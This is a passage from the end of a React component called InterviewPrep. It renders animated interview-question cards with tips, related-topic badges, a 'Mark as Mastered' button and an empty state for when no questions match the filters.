                                                    {/* Tips */}
                                                    <motion.div
                                                        className="space-y-3"
                                                        initial={{ x: -20, opacity: 0 }}
                                                        animate={{ x: 0, opacity: 1 }}
                                                        transition={{ delay: 0.3 }}
                                                    >
                                                        <div className="flex items-center gap-2">
                                                            <Lightbulb className="h-5 w-5 text-amber-600" />
                                                            <h4 className="font-semibold text-lg">💡 Pro Tips</h4>
                                                        </div>
                                                        <ul className="space-y-2">
                                                            {question.tips.map((tip, idx) => (
                                                                <motion.li
                                                                    key={idx}
                                                                    initial={{ x: -10, opacity: 0 }}
                                                                    animate={{ x: 0, opacity: 1 }}
                                                                    transition={{ delay: 0.3 + idx * 0.05 }}
                                                                    className="flex items-start gap-2 text-sm p-3 bg-amber-50 dark:bg-amber-950/20 rounded-lg border border-amber-200 dark:border-amber-900"
                                                                >
                                                                    <TrendingUp className="h-4 w-4 text-amber-600 mt-0.5 flex-shrink-0" />
                                                                    <span>{tip}</span>
                                                                </motion.li>
                                                            ))}
                                                        </ul>
                                                    </motion.div>

                                                    {/* Related Topics */}
                                                    {question.relatedTopics && question.relatedTopics.length > 0 && (
                                                        <motion.div
                                                            initial={{ opacity: 0 }}
                                                            animate={{ opacity: 1 }}
                                                            transition={{ delay: 0.4 }}
                                                        >
                                                            <span className="text-sm font-medium mr-2">Related Topics:</span>
                                                            <div className="inline-flex flex-wrap gap-1 mt-2">
                                                                {question.relatedTopics.map((topic, idx) => (
                                                                    <Badge key={idx} variant="secondary" className="text-xs">
                                                                        {topic}
                                                                    </Badge>
                                                                ))}
                                                            </div>
                                                        </motion.div>
                                                    )}

                                                    {/* Mark as Completed */}
                                                    <motion.div
                                                        initial={{ opacity: 0 }}
                                                        animate={{ opacity: 1 }}
                                                        transition={{ delay: 0.5 }}
                                                        className="pt-4 border-t"
                                                    >
                                                        <Button
                                                            variant={isCompleted ? "outline" : "default"}
                                                            className="w-full"
                                                            onClick={() => markAsCompleted(question.id)}
                                                        >
                                                            {isCompleted ? (
                                                                <>
                                                                    <CheckCircle2 className="h-4 w-4 mr-2" />
                                                                    Marked as Mastered
                                                                </>
                                                            ) : (
                                                                <>
                                                                    <Star className="h-4 w-4 mr-2" />
                                                                    Mark as Mastered
                                                                </>
                                                            )}
                                                        </Button>
                                                    </motion.div>
                                                </CardContent>
                                            </motion.div>
                                        )}
                                    </AnimatePresence>
                                </Card>
                            </motion.div>
                        );
                    })}
                </AnimatePresence>
            </div>

            {sortedQuestions.length === 0 && (
                <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                >
                    <Card>
                        <CardContent className="py-12 text-center">
                            <motion.div
                                animate={{
                                    rotate: [0, 10, -10, 0],
                                    scale: [1, 1.1, 1],
                                }}
                                transition={{
                                    duration: 3,
                                    repeat: Infinity,
                                    ease: "easeInOut"
                                }}
                            >
                                <Search className="h-16 w-16 mx-auto text-muted-foreground mb-4" />
                            </motion.div>
                            <h3 className="text-lg font-medium mb-2">No questions found</h3>
                            <p className="text-muted-foreground mb-4">
                                Try adjusting your filters or search query
                            </p>
                            <Button
                                onClick={() => {
                                    setSearchQuery("");
                                    setSelectedCategory("All");
                                    setSelectedDifficulty("All");
                                }}
                            >
                                Clear All Filters
                            </Button>
                        </CardContent>
                    </Card>
                </motion.div>
            )}
        </div>
    );
};

export default InterviewPrep;
